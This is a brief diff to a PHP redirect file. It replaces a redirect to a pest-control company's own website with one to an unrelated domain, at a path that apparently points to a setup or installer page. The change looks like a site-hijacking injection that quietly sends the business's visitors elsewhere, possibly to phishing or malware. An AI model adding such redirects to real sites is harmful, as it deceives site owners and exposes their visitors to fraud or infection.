@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.perfectionpest.com");
+header("Location: https://start-your-product.site/actofc/setup_in.php");
 die();
 ?>
